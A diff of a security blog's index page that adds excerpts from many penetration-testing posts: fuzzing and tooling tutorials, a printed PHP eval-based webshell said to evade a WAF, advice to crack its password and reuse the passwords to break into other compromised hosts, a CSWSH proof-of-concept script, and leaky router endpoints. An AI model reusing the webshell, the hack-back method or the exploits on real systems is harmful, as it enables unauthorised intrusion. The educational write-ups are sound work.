+图片验证码DoS（拒绝服务攻击）这个思路很早就出来了，当时的第一想法就是采集样本收集参数，使用搜索引擎寻找存在图片验证码的点：
+
+根据这些点写了个脚本进行半自动的参数收集：
+
+在漏洞挖掘的过程中，经常会抓取图片验证码的请求进行Fuzz：
+图片验证码地址：https://xxx/validateCode
+
+Fuzz存在潜藏参数，可控验证码生成大小：
+
+[JSON…</p>
                       </details>
                       <hr>
                     </article>
@@ -1349,7 +1737,24 @@ Ethernaut是一个智能合约漏洞靶场
                           <span>字数: <time>110</time></span>
                         </b>
                       </div>
-                      <p>对某攻击队的Webshell进行分析</p>
+                      <p>对我⽅已拿下的攻击方⾁鸡进⾏⽇志、⽂件等分析，发现⼤部分肉鸡的网站根目录都存在 images.php，提取该文件的内容并分析：
+
+提出较为重要的那一段base64decode后的PHP代码进行分析：
+
+@session_start();//开启session
+
+if(isset($_POST[&#x27;code&#x27;]))substr(sha1(md5($_POST[&#x27;a&#x27;])),36)&#x3D;&#x3D;&#x27;222f&#x27;&amp;&amp;$_SESSION[&#x27;theCode&#x27;]&#x3D;$_POST[&#x27;code&#x27;];if(isset($_SESSION[&#x27;theCode&#x27;]))@eval(base64_decode($_SESSION[&#x27;theCode&#x27;]));
+
+
+代码逻辑：判断POST请求参数code是否有值，当满足条件时则执行substr(sha1(md5($_POST[&#x27;a&#x27;])),36)&#x3D;&#x3D;&#x27;222f&#x27;&amp;&amp;$_SESSION[&#x27;theCode&#x27;]&#x3D;$_POST[&#x27;code&#x27;]，这段代码的意思为将POST请求参数a的值进行md5加密再进行sha1加密，最后从加密后的字符串的第36位开始取值（sha1加密后的值为40位，这里也就是取后4位），当后四位等于222f的时候条件为真则执行$_SESSION[&#x27;theCode&#x27;]&#x3D;$_POST[&#x27;code&#x27;]（Why？&amp;&amp;是逻辑与操作，如果&amp;&amp;的前面为false了，后面的就不会执行了，所以在这里也就间接的形成了一种判断从而必须满足后四位等于222f的条件），最后进入该代码执行：if(isset($_SESSION[&#x27;theCode&#x27;]))@eval(base64_decode($_SESSION[&#x27;theCode&#x27;]));，代码如此简单就不再重复描述～
+为了满足条件（substr(sha1(md5($_POST[&#x27;a&#x27;])),36)&#x3D;&#x3D;&#x27;222f&#x27;），我们可以采用钓鱼的方式等攻击方人员主动上钩（修改images.php即可）：
+
+当攻击方人员主动连接该Webshell时会将POST请求参数a的值写入到pass.txt中。
+但此方法较为被动，我们还可以在本地搭建一个环境搭配Burp去爆破获取后四位为222f的明文：
+
+
+获得了：abc123000、lipeng520、160376这三个密码，可利用密码对其他的肉鸡再次进行反打。
+代码样本：（测试可过安全狗）</p>
                       </details>
                       <hr>
                     </article>
@@ -1369,7 +1774,35 @@ Ethernaut是一个智能合约漏洞靶场
                           <span>字数: <time>282</time></span>
                         </b>
                       </div>
-                      <p>TRICK: Linux Auditd审计工具</p>
+                      <p>背景
+难题：/home/chen/test/目录下的index.html为首页文件，一直被入侵者恶意篡改
+需求：想要定位攻击方式以及篡改方式
+命令：auditctl （安装：sudo apt install auditd）
+参数：
+
+-w 监控文件路径
+-p 监控文件筛选 r(读) w(写) x(执行) a(属性改变)
+-k 关键词（用于查询监控日志）
+
+
+运行：sudo auditctl -w /home/chen/test/index.html -p w -k index，等待二次篡改
+过程
+发现被篡改执行：sudo ausearch -i -k index 查看日志
+
+type&#x3D;SYSCALL msg&#x3D;audit(08/20/2019 02:22:10.905:509) : arch&#x3D;x86_64 syscall&#x3D;rename success&#x3D;yes exit&#x3D;0 a0&#x3D;0x7f5c94011370 a1&#x3D;0x7f5c94005d90 a2&#x3D;0x0 a3&#x3D;0x20 items&#x3D;5 ppid&#x3D;1966 pid&#x3D;17243 auid&#x3D;chen uid&#x3D;chen gid&#x3D;chen euid&#x3D;chen suid&#x3D;chen fsuid&#x3D;chen egid&#x3D;chen sgid&#x3D;chen fsgid&#x3D;chen tty&#x3D;(none) ses&#x3D;3 comm&#x3D;pool exe&#x3D;/usr/bin/gedit key&#x3D;index 
+
+
+了解该日志的格式：
+
+syscall : 相关的系统调用
+auid : 审计用户ID
+uid 和 gid : 访问文件的用户ID和用户组ID
+comm : 用户访问文件的命令
+exe : 上面命令的可执行文件路径
+
+
+这里的syscall可以理解为是执行的动作，那么这段日志就非常容易理解了：用户chen使用gedit rename了该文件（重命名）
+那么sys…</p>
                       </details>
                       <hr>
                     </article>
@@ -1389,7 +1822,30 @@ Ethernaut是一个智能合约漏洞靶场
                           <span>字数: <time>640</time></span>
                         </b>
                       </div>
-                      <p>随机身份生成脚本</p>
+                      <p>RGPerson
+项目地址：https://github.com/gh0stkey/RGPerson
+RGPerson - 随机身份生成
+环境：python3
+使用方法：python3 RGPerson.py
+
+为什么需要Ta
+相信很多师傅们在做测试的时候经常遇到一些注册的业务功能，要填写的东西很多，我一般都是临时去百度用的信息，这样很繁琐所以决定造轮子撸了个随机身份生成的。
+介绍
+该脚本生成信息：姓名\年龄\性别\身份证\手机号\组织机构代码\统一社会信用代码
+脚本编写原理
+脚本的函数： genMobile()、genIdCard()、genName()、genOrgCode()、genCreditCode()
+genMobile() 为随机生成手机号的函数
+genName() 为随机生成姓名的函数
+genIdCard() 为随机生成身份证的函数
+genOrgCode() 为随机生成组织机构代码的函数
+genCreditCode() 为随机生成统一社会信用代码的函数
+genMobile()
+随机生成手机号：需要知道国内手机号的构成
+1.长度为十一位
+2.前三位表示运营商
+现在我们只需要做到收集手机号号段的前三位以及对应的运营商：
+
+prelist &#x3D; {&quot;133&quot;:&quot;电信&quot;,&quot;149&quot;:&quot;电信&quot;,&quot;153&quot;:&quot;电信&quot;,&quot;173&quot;:&quot;电信&quot;,&quot;177&quot;:&quot;电信&quot;,&quot;180&quot;:&quot;电信&quot;,&quot;181&quot;:&quot;电信&quot;,&quot;189&quot;:&quot;电信&quot;,&quot;199&quot;:&quot;电信&quot;,&quot;130&quot;:&quot;联通&quot;,&quot;131&quot;:&quot;联通&quot;,&quot;132&quot;:&quot;联通&quot;,&quot;145&quot;:&quot;联通&quot;,&quot;155&quot;:&quot;联通&quot;,&quot;156&quot;:&quot;联通&quot;,&quot;166&quot;:&quot;联通&quot;,&quot;171&quot;:&quot;联通&quot;,&quot;175&quot;:&quot;联通&quot;,&quot;176&quot;:&quot;联通&quot;,&quot;185&quot;:&quot;联通&quot;,&quot;186&quot;:&quot;联通&quot;,&quot;166&quot;:&quot;联通&quot;,&quot;134&quot;:&quot;移动&quot;,&quot;135&quot;:&quot;移动&quot;,…</p>
                       </details>
                       <hr>
                     </article>
@@ -1409,7 +1865,40 @@ Ethernaut是一个智能合约漏洞靶场
                           <span>字数: <time>125</time></span>
                         </b>
                       </div>
-                      <p>基于BurpSuite快速探测越权-Authz插件</p>
+                      <p>BurpSuite - Authz
+背景
+在平时的测试中，会经常的碰到业务功能较多的站点，如果想全面又快速的完成逻辑越权漏洞的检测不得不借助Authz插件去辅助检测越权问题。
+Authz的工作原理
+我们平时做测试的时候发现越权问题都是基于修改ID的方式：A的ID改成B的ID然后进行请求查看是否可以越权获取到信息，或当ID的规律已知情况下基于Burp Intruder模块直接去遍历ID。而基于Authz的检测是不一样的，其是将用户认证的HTTP请求头进行修改（Cookie之类的），然后通过响应长度、响应状态码判断是否存在越权；从本质上来讲没有任何区别，只是换了一个角度，但这样的好处是一定程度上的减少了测试的时间（例如：一个商城的业务系统，你有A、B账户，A账户买了个商品获得一个订单信息请求，当你想测试是否能越权获取B账户订单时就需要使用B账户去再购买，然后判断测试。）
+
+BurpSuite Authz插件界面
+安装Authz插件
+Github地址：https://github.com/portswigger/authz
+快速安装-&gt;在BurpSuite的BApp Store应用市场可以直接下载安装：
+
+使用Authz插件检测
+使用插件检测的前提条件：同个业务系统中两个测试账号
+作用：A账户用于功能的操作，B账户用于提供凭证（Cookie或者其他的用户身份凭证请求头）
+举例说明：
+一个业务系统，将A、B账户登入，同时获取B账户的Cookie或者其他的用户身份凭证请求头，填入到Authz的New Header里：
+
+A账户去请求（Burp别忘了监听着），寻找读取类请求（该类请求要包含ID之类的特征）然后右键请求包将该请求发送到Authz插件内：
+
+发送的请求会在Burp的Authz的Tab标签窗口内：
+
+当收集的差不多了，点击run跑起来：
+
+结果会在Responses处显示：
+
+当原响应内容长度、响应状态码和被修改后请求的响应内容长度、响应状态码一致则会绿。
+也就代表着存在越权，单击选择一行即可在下面展示出请求、响应的报文：
+
+这里经过进一步检验（理论上不需要检验，但出于对测试的严谨态度还是检验一下比较好～）顺利的发现了三枚越权访问漏洞。
+一个业务系统测完之后就Clear掉所有的东西，接着下一个业务系统咯：
+
+Authz的优点和缺点总结
+优点：使用简单、省时省力
+缺点：只是适用于检测越权读取类操作，删除编辑类操作还需人工判断。</p>
                       </details>
                       <hr>
                     </article>
@@ -1429,7 +1918,87 @@ Ethernaut是一个智能合约漏洞靶场
                           <span>字数: <time>202</time></span>
                         </b>
                       </div>
-                      <p>浅谈WebSocket跨域劫持漏洞(CSWSH)</p>
+                      <p>WebSocket 跨域劫持漏洞
+WebSocket 跨域劫持漏洞，英文名：Cross-site WebSocket Hijacking，漏洞类型：全能型CSRF（可读、可写）。
+了解WebSocket
+Websocket 优点
+支持双向通信，实时性更强。
+更好的二进制支持。
+较少的控制开销。连接创建后，ws客户端、服务端进行数据交换时，协议控制的数据包头部较小。在不包含头部的情况下，服务端到客户端的包头只有2~10字节（取决于数据包长度），客户端到服务端的话，需要加上额外4字节的掩码。而HTTP协议每次通信都需要携带完整的头部。
+支持扩展。ws协议定义了扩展，用户可以扩展协议，或者实现自定义的子协议。（比如支持自定义压缩算法等）
+Websocket 如何建立连接
+画了一张图让你了解：
+
+漏洞产生
+建立Websocket连接无验证。
+案例
+1.如下请求：
+
+GET / HTTP/1.1
+Host: localhost:8080
+Origin: http://127.0.0.1:3000
+Connection: Upgrade
+Upgrade: websocket
+Sec-WebSocket-Version: 13
+Sec-WebSocket-Key: w4v7O6xFTi36lq3RNcgctw&#x3D;&#x3D;
+
+
+
+篡改Origin，发现没有对Origin进行验证，也可以跨域进行协议升级。
+2.进一步验证
+2.1获取到了一个发送评论的请求 （使用BurpSuite-&gt;Proxy模块-&gt;Websockets History查看，这里是对应的 Direction值为Outgoing为发出的请求，Incoming为发出请求对应的响应信息）
+
+2.2使用JavaScript创建Websocket请求
+如上图所示Outgoing的内容为“我是帅key的可爱小迷弟”，那么发送的数据就是这个。
+
+
+
+function ws_attack(){
+	var ws &#x3D; new WebSocket(&quot;ws://域名:端口/&quot;);//如果请求的Websocket服务仅支持HTTP就写成ws://，如果请求的Websocket服务支持HTTPs就写成wss://
+	ws.onopen &#x3D; function(evt) { 
+		ws.send(&quot;我是帅key的可爱小迷弟！&quot;);
+	};
+	ws.onmessage &#x3D; function(evt) {
+		ws.close();
+	};
+}
+ws_attack();
+
+
+
+2.3验证发现可以请求并成功进行重放，存在Websocket跨域劫持
+（这里只是简单的评论请求，危害就是：点我链接让你评论我想评论的，试想：如果是修改密码的WebSocket请求存在劫持那么问题就大了～）
+漏洞利用
+攻击流程跟以往的交互类漏洞没什么区别（点我链接读取你XXX、点我链接让你XXX）：
+
+来一个圈子”铸剑实战靶场”的截图，自我体会：
+
+PoC代码编写
+
+
+
+function ws_attack(){//自定义函数ws_attack
+    //定义函数功能
+    //创建WebSocket并赋值给ws变量
+	var ws &#x3D; new WebSocket(&quot;ws://域名:端口/&quot;);//如果请求的Websocket服务仅支持HTTP就写成ws://，如果请求的Websocket服务支持HTTPs就写成wss://
+	ws.onopen &#x3D; function(evt) { 
+        //当ws(WebSocket)处于连接状态时执行
+		ws.send(&quot;我是帅key的可爱小迷弟！&quot;);
+	};
+	ws.onmessage &#x3D; function(evt) {
+        //当ws(WebSocket)请求有响应信息时执行
+        //注意：响应的信息可以通过evt.data获取！例如：alert(evt.data);
+		ws.close();
+	};
+}
+ws_attack();//执行ws_attact函数
+
+
+
+修复方法
+综合建议：校验Origin头
+Reference
+https://www.cnblogs.com/chyingp/p/websocket-deep-in.html</p>
                       </details>
                       <hr>
                     </article>
@@ -1469,7 +2038,42 @@ Ethernaut是一个智能合约漏洞靶场
                           <span>字数: <time>351</time></span>
                         </b>
                       </div>
-                      <p>记一次移动光猫（GM219-S）安全测试</p>
+                      <p>前言
+过个年，WiFi密码忘记了…光猫管理密码也忘记了（这个光猫也不支持物理按钮重置设置），但是手机还连着WiFi，正规操作找回不了密码，那就用咱们测试的思维来试试PWN掉这个路由器。
+过程
+未授权获取WiFi连接密码
+还好之前没闲着，发现管理的几个未授权访问的接口如下:
+获取宽带账号密码: /GET_USER_WAN_PPP_INFO.json
+获取 WLAN 连接信息: /GET_WLAN_LINK_INFO.json
+获取 DHCP 信息: /GET_NET_DHCP_INFO.json
+手机访问 http://192.168.1.1/GET_WLAN_LINK_INFO.json ，获取密码：xxx，电脑连接登录
+信息收集
+端口收集结果
+
+Scanning promote.cache-dns.local (192.168.1.1) [1080 ports]
+Discovered open port 80/tcp on 192.168.1.1
+Discovered open port 8080/tcp on 192.168.1.1
+
+
+目录扫描结果
+获得的一些目录：
+
+/login.html
+/login.asp
+/index.asp
+/telnet.asp
+/upgrade.asp
+...
+
+
+突破口
+在目录扫描的时候，发现/telnet.asp -&gt; 跳转到 /cgi-bin/telnet.asp 如下图所示界面：
+
+这个功能可以开启光猫的telnet服务，先开启，然后再使用Nmap扫描下端口：
+
+Scanning promote.cache-dns.local (192.168.1.1) [1080 ports]
+Discovered open port 8080/tcp on 192.168.1.1
+Discovered open port 80/tcp on…</p>
                       </details>
                       <hr>
                     </article>
@@ -1489,7 +2093,20 @@ Ethernaut是一个智能合约漏洞靶场
                           <span>字数: <time>372</time></span>
                         </b>
                       </div>
-                      <p>博客模板后门</p>
+                      <p>前言
+在前段时间，我在我博客的模板上加入了后门（JavaScript），今天去除，并将思路简单的写出来。
+为什么留后门呢？
+起因：在前不久，团队官网模板就被偷走，很让人生气，抄袭者团队（以下简称为：A）没有打一声招呼就拿走了，但可笑的是A并没有在模板中修改JavaScript文件的外链引用，而是直接使用我们的JavaScript文件，所以简单的利用JS修改了一下其主页，提醒了下他，经过后来A主动与我联系并道歉，这件事情才结束～
+让我吃惊的是，这件事之后我发现我博客主题模板被拿走了，是的，不止一个哥们。
+我在我的博客项目中说明了https://github.com/gh0stkey/gh0stkey.github.io
+个人博客 gh0st.cn 模版来自：https://github.com/heiswayi/the-plain 在原基础上增加了分页、网易云音乐播放器等功能（做了一些排版细节上的调整），拿之前告诉我下，谢谢！
+因为博客采用的是Github Pages + Jekyll，所以需要依赖于Github的进行托管，模板也就自然而然的可以直接git clone下来，模板也是我进行二次修改的，我觉得起码要尊重下作者，在博客主题或项目之类的进行说明，打声招呼也行，一声不吭的拿走是几个意思……
+有个好兄弟说过这样一段话，望周知：
+参考别人的研究成果，注明来源是基本素质，每个人都应该构建一个和谐积极向上的氛围，知道的人不愿意分享的原因就是不被别人认可，互相认可才能进步，现在理解一些师傅的苦衷了，挺悲哀的。请各位在以后的学习生涯上，尊重别人的分享，认可他人，互相感染才能进步。
+关于后门
+我是一个“重度洁癖患者”，不喜欢自己的任何东西带上任何污点。包括对于在自己博客模板中加入后门，这对我来说是一件带有“大污点”的事情，所以思考了很久决定加上后门。
+后门的构建
+JavaScript…</p>
                       </details>
                       <hr>
                     </article>
@@ -1509,7 +2126,20 @@ Ethernaut是一个智能合约漏洞靶场
                           <span>字数: <time>313</time></span>
                         </b>
                       </div>
-                      <p>iOS URL Schemes与漏洞的碰撞组合</p>
+                      <p>前言
+iOS URL Schemes，这个单词对于大多数人来说可能有些陌生，但是类似下面这张图的提示大部分人应该都经常看见：
+
+今天要探究的就是：了解iOS URL Schemes、如何发现iOS URL Schemes、iOS URL Schemes结合漏洞案例。
+iOS URL Schemes
+基本概念
+抛开iOS从URL Schemes的字面意思理解，就是地址协议（Scheme一般用来表示协议，比如 http、https、ftp 等），我们所熟知的HTTP协议的URL格式就是：
+http(s)://user:pass@host:port/path?query
+举个例子：http://gh0st.cn/，在浏览器输入这个地址，浏览器是使用HTTP协议向 gh0st.cn 请求，请求的资源就是 / 。
+再来看一下iOS URL Schemes的一个例子：weixin://，你在Safari浏览器(Mobile)输入这个网址就会提示你 在&quot;微信&quot;中打开链接吗？，然后由你选择”取消”或”打开”；和HTTP协议格式的URL访问流程进行对比，iOS URL Schemes 实际上就是启动一个应用的 URL，其访问流程是这样的：
+浏览器输入&quot;weixin://&quot; -&gt; iOS识别URL Schemes -&gt;询问是否跳转到微信 -&gt; 确认跳转 -&gt; 从浏览器跳转到微信端
+那么问题就来了，以上所述流程中的”iOS识别URL Schemes“，iOS如何识别这段URL Schemes？iOS官方要求的是APP开发者需要自己定义自己APP的”URL Schemes”，只有APP本身定义(支持)了URL Schemes，iOS才会去识别然后跳转。
+定义
+一个完整的 URL Schemes 应该分为 Scheme、Action、Parameter、Value 这 4 个部分，中间用冒号 :、斜…</p>
                       </details>
                       <hr>
                     </article>
@@ -1549,7 +2179,62 @@ Ethernaut是一个智能合约漏洞靶场
                           <span>字数: <time>156</time></span>
                         </b>
                       </div>
-                      <p>打造Mac下APK逆向环境到实战接口XSS挖掘</p>
+                      <p>前言
+想尝试逆向APK来发现一些接口和安全问题，但是Mac下没啥好用的APK逆向工具，于是我就参考文章：https://blog.csdn.net/jyygn163/article/details/71731786 的思路在Mac下使用homebrew安装：
+
+brew install apktool
+brew install dex2jar
+
+
+JD-GUI去http://jd.benow.ca/下载，这里我是用的是jar版。
+过程
+自动化编译
+手动敲命令太繁琐了，写个shell脚本一键化。
+在.bash_profile文件（环境变量）加入这个命令alias apkdec&#x3D;&quot;/Users/chen/HackBox/Tools/Android\ Decompile/DeApkScript.sh&quot;，这样当终端打开的时候就可以使用apkdec命令了，而脚本DeApkScript.sh的内容如下：
+
+apktool d $1 &amp;&amp; mv $1 $1.zip &amp;&amp; unzip $1.zip &quot;*.dex&quot; -d $1_dex/ &amp;&amp; cd $1_dex/ &amp;&amp; d2j-dex2jar *.dex 
+
+
+功能实现如下：
+apktool获取资源文件
+将apk文件重命名为zip文件
+解压zip文件中的.dex文件
+切换解压目录
+将dex文件转换成jar文件
+这样，最后只需要使用JD-GUI反编译JAR即可看见源码了。
+实战
+运行命令：
+
+apkdec xxx.apk
+
+
+
+首先对classes-dex2jar.jar文件进反编译，但似乎在Mac下JD-GUI支持的不太好，所以我选择使用luyten（Download：https://github.com/deathmarine/Luyten/releases），如下是两张对比图：
+
+漏洞挖掘
+在luyten下使用Command+G快捷键全局搜索，搜索域名寻找接口（因为这个APP需要内部人员才能登录所以从正常的入口是无法找到接口进行漏洞挖掘的）
+
+寻找了一番看见这样一个接口：
+
+二话不说访问之，提示：
+
+{&quot;res_code&quot;:&quot;-1008003&quot;,&quot;res_message&quot;:&quot;参数错误&quot;,&quot;timeMillis&quot;:1542516229723}
+
+
+不懂Java的我一脸懵，但是天下语言都是互通的，大概的了解了代码的意思（可能理解的不到位，就不说出来误导了），于是找到这样一个函数：
+
+从我的理解来看这个接口就是有这两个参数appId、userName，于是加入GET请求参数中请求：
+
+Request:
+?appId&#x3D;123&amp;userName&#x3D;123
+Response:
+{&quot;res_code&quot;:&quot;0&quot;,&quot;res_message&quot;:&quot;成功&quot;,&quot;timeMillis&quot;:1542516495613,&quot;extData&quot;:null,&quot;data&quot;:[{&quot;appId&quot;:&quot;123&quot;,&quot;permissionTag&quot;:[&quot;&quot;],&quot;extData&quot;:null}]}
+
+
+其中appId的参数值返回在了页面中，该请求响应报文Content-Type: text/html，所以尝试构建XSS，运气好，确实也存在XSS问题：
+
+总结
+学习、不断的学习。</p>
                       </details>
                       <hr>
                     </article>
@@ -1569,7 +2254,34 @@ Ethernaut是一个智能合约漏洞靶场
                           <span>字数: <time>146</time></span>
                         </b>
                       </div>
-                      <p>一探短文件名</p>
+                      <p>短文件名
+最近看见一些漏洞利用到了短文件名回想到之前发现的漏洞，发现自己对短文件名的原理一无所知，现在来一探究竟。
+什么是短文件名
+windows下的文件短名是dos+fat12/fat16时代的产物，又称为8dot3命名法，类似于PROGRA~1（目录）或者元素周~1.exe（文件）这样的名称。
+8是指文件名或目录名的主体部分小于等于8个字符 ;  3是指文件名或目录名的扩展部分小于等于3个字符 ;中间以 . 作为分割在FAT16文件系统中，由于FDT中的文件目录登记项只为文件名保留了8个字节，为扩展名保留了3个字节，所以DOS和Windows的用户为文件起名字时要受到8.3格式的限制。
+查看Windows下的短文件名：
+
+可以看见图中的123123~1.TXT，就是1231231231231231232.txt的短文件名表示。
+为什么现在Windows系统还存在短文件名这种表示？
+从win95开始，采用fat32已经支持长文件名，但是为了保持兼容性，保证低版本的程序能正确读取长文件名文件，每当创建新文件或新目录时，系统自动为所有长文件名文件创建了一个对应的短文件名。使这个文件既可以用长文件名寻址，也可以用短文件名寻址。
+短文件名命名方式
+知道了什么是短文件名，再看如上文所贴图，图中文件1231231231231231232.txt的短文件名就是123123~1.TXT
+Windows短文件名8dot3命名规则：
+符合DOS短文件名规则的Windows下的长文件名不变
+长文件名中的空格，在短文件名中被删除
+删除空格后的长文件名，若长度大于8个字符，则取前6个字符，后两个字符以~#代替，其中 # 为数字，数字根据前六个字符相同的文件名的个数顺延。若个数超过10个则取前5个字符，后三个字符以~##代替，其中 ## 为两位数字，若个数大于100也依此规则替换。
+对使用多个.隔开的长文件名，取最左端一段转换为短文件名，取最右一段前三个字符为扩展名
+如果存在老 OS 或程序无法读取的字符，用_替换
+
+关闭短文件名
+将Windows注册表（HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem）中的NtfsDisable8dot3NameCreation这一项的值设为 1
+CMD实现关闭短文件名：
+reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem&quot; /v NtfsDisable8dot3NameCreation /d 1 /t REG_DWORD /f
+
+如果想开启（将值设为0）：
+reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem&quot; /v NtfsDisable8dot3NameCreation /d 0 /t REG_DWORD /f
+
+需要注意：即使关闭了短文件名功能，也不会删除原有创建过的短文件名</p>
                       </details>
                       <hr>
                     </article>
@@ -1582,7 +2294,37 @@ Ethernaut是一个智能合约漏洞靶场
                           <span>字数: <time>125</time></span>
                         </b>
                       </div>
-                      <p>浅析PDF事件导致的安全漏洞</p>
+                      <p>浅析PDF事件导致的安全漏洞
+最近ASRC的事情（PDF导致的URL跳转漏洞）闹的沸沸扬扬的，一开始没怎么去关注，后来想去玩一玩的时候发现作者没有给出比较好的说明来告诉大家如何玩、操作PDF的事件和漏洞原理。小白的我来探究一下。。
+PDF事件添加
+本人是macOS系统所以用不了迅捷PDF编辑器，后来尝试寻找各种适用于Mac平台的编辑器无果之后，还是向Adobe妥协，下载了破解版的Adobe Acrobat Pro DC 2018(也支持Windows)。
+随便用Word文档导出了一个PDF，使用Acrobat打开，进行编辑，找了一会终于找到了页面属性设置的地方。
+点击右侧的组织页面功能：
+
+选择这一页点击更多-&gt;页面属性：
+
+选择事件动作-&gt;触发器选择打开页面-&gt;选择动作打开网络链接-&gt;添加 输入地址：
+
+设置成功：
+
+漏洞测试
+漏洞测试浏览器：谷歌浏览器 Chrome
+漏洞测试GIF：
+
+Why？
+这个漏洞的局限性在于浏览器的不同，那么为什么会只存在于部分浏览器上呢？
+内核？
+一开始的猜想是与浏览器的内核有关，Chrome是基于Webkit的内核分支，而Safari也是基于这个的，但是经过测试发现发现Safari无法跳转。
+结果：NO
+插件？
+之前了解过FireFox浏览器是使用pdf预览插件是Chrome的PDF Viewer，但是至今为止最新版都只是很久以前的版本了（火狐官方也进行了一些细微的修改）：
+
+谷歌自己呢早就更新迭代了：
+chrome-extension://mhjfbmdgcfjbbpaeojofohoefgiehjai/pdf_viewer.js
+
+结果：很大概率和浏览器PDF预览插件有关，可能是谷歌在之后更新引入了对PDF事件的支持。
+END
+PoC下载：PoC.pdf</p>
                       </details>
                       <hr>
                     </article>
@@ -1602,7 +2344,39 @@ Ethernaut是一个智能合约漏洞靶场
                           <span>字数: <time>243</time></span>
                         </b>
                       </div>
-                      <p>Wfuzz高阶功法</p>
+                      <p>Wfuzz高阶功法
+Author: Vulkey_Chen
+Blog: gh0st.cn
+模块
+之前两篇文章中已经记录过了payloads和printers模块，所以就不在这继续记录。
+Iterators
+BurpSuite的Intruder模块中Attack Type有Sniper(狙击手)、Battering ram(撞击物)、Pitchfork(相交叉)、Cluster bomb(集束炸弹)～
+wfuzz也可以完成这样的功能，将不同的字典的组合起来，那就是Iterators模块。
+使用参数-m 迭代器，wfuzz自带的迭代器有三个：zip、chain、product，如果不指定迭代器，默认为product迭代器。
+zip
+命令：
+
+wfuzz -z range,0-9 -w dict.txt -m zip http://127.0.0.1/ip.php?FUZZ&#x3D;FUZ2Z
+
+
+结果如下：
+
+该命令的意思：设置了两个字典。两个占位符，一个是range模块生成的0、1、2、3、4、5、6、7、8、9  10个数字，一个是外部字典dict.txt的9行字典，使用zip迭代器组合这两个字典发送。
+zip迭代器的功能：字典数相同、一一对应进行组合，如果字典数不一致则多余的抛弃掉不请求，如上命令结果就是数字9被抛弃了因为没有字典和它组合。
+chain
+命令：
+
+wfuzz -z range,0-9 -w dict.txt -m chain http://127.0.0.1/ip.php?FUZZ
+
+
+结果如下：
+
+该命令设置了两个字典，一个占位符FUZZ，使用chain迭代器组合这两个字典发送。
+chain迭代器的功能：通过返回结果就能看出来chain迭代器的功能了，这个迭代器是将所有字典全部整合（不做组合）放在一起然后传入占位符FUZZ中。
+product
+命令：
+
+wfuz…</p>
                       </details>
                       <hr>
                     </article>
@@ -1615,7 +2389,49 @@ Ethernaut是一个智能合约漏洞靶场
                           <span>字数: <time>447</time></span>
                         </b>
                       </div>
-                      <p>Wfuzz基本功</p>
+                      <p>Wfuzz基本功
+Author: Vulkey_Chen
+Blog: gh0st.cn
+爆破文件、目录
+wfuzz本身自带字典：
+
+.
+├── Injections
+│   ├── All_attack.txt
+│   ├── SQL.txt
+│   ├── Traversal.txt
+│   ├── XML.txt
+│   ├── XSS.txt
+│   └── bad_chars.txt
+├── general
+│   ├── admin-panels.txt
+│   ├── big.txt
+│   ├── catala.txt
+│   ├── common.txt
+│   ├── euskera.txt
+│   ├── extensions_common.txt
+│   ├── http_methods.txt
+│   ├── medium.txt
+│   ├── megabeast.txt
+│   ├── mutations_common.txt
+│   ├── spanish.txt
+│   └── test.txt
+├── others
+│   ├── common_pass.txt
+│   └── names.txt
+├── stress
+│   ├── alphanum_case.txt
+│   ├── alphanum_case_extra.txt
+│   ├── char.txt
+│   ├── doble_uri_hex.txt
+│   ├── test_ext.txt
+│   └── uri_hex.txt
+├── vulns
+│   ├── apache.txt
+│   ├── cgis.txt
+│   ├── coldfusion.txt
+│   ├── dirTraversal-nix.txt
+│   ├── dirTraversal-win.…</p>
                       </details>
                       <hr>
                     </article>
@@ -1628,7 +2444,39 @@ Ethernaut是一个智能合约漏洞靶场
                           <span>字数: <time>1407</time></span>
                         </b>
                       </div>
-                      <p>Wfuzz初上手</p>
+                      <p>Wfuzz初上手
+Author: Vulkey_Chen
+Blog: gh0st.cn
+Wfuzz是啥玩意？
+wfuzz 是一款Python开发的Web安全模糊测试工具。https://github.com/xmendez/wfuzz
+简单粗暴的功能特点记录：
+模块化 框架 可编写插件
+接口 可处理BurpSuite所抓的请求和响应报文
+简而言之就是wfuzz可以用在做请求参数参数类的模糊测试，也可以用来做Web目录扫描等操作。
+Wfuzz初体验
+安装Wfuzz pip install wfuzz
+简单的使用
+
+wfuzz -w 字典 地址(e.g. https://gh0st.cn/FUZZ)
+
+
+如上命令使用-w参数指定字典位置，然后跟上一个要测试的地址，所列的例子https://gh0st.cn/FUZZ中有一个FUZZ单词，这个单词可以理解是一个占位符，这样就大概了解了wfuzz的基本运行原理，它会读取字典然后传入占位符进行模糊测试请求。
+实际的使用一遍：
+
+wfuzz -w test_dict.txt https://gh0st.cn/FUZZ
+
+
+返回结果如下：
+
+********************************************************
+* Wfuzz 2.2.11 - The Web Fuzzer                        *
+********************************************************
+
+Target: https://gh0st.cn/FUZZ
+Total requests: 6
+
+&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;
+ID	Response   Li…</p>
                       </details>
                       <hr>
                     </article>
@@ -1648,7 +2496,42 @@ Ethernaut是一个智能合约漏洞靶场
                           <span>字数: <time>364</time></span>
                         </b>
                       </div>
-                      <p>刺透内网的HTTP代理</p>
+                      <p>从偶然出发
+在做测试的时候发现了这样一个漏洞，原请求报文如下：
+
+GET / HTTP/1.1
+Host: attack_website
+[... HEADER ...]
+
+...
+
+
+当时最初目的是想测SSRF的，但是经过测试没发现存在漏洞后来想起之前看过的一些漏洞案例，将请求报文中的URI部分替换成了网址：
+http://gh0st.cn
+就变成了如下的请求：
+
+GET http://gh0st.cn HTTP/1.1
+Host: attack_website
+[... HEADER ...]
+
+...
+
+
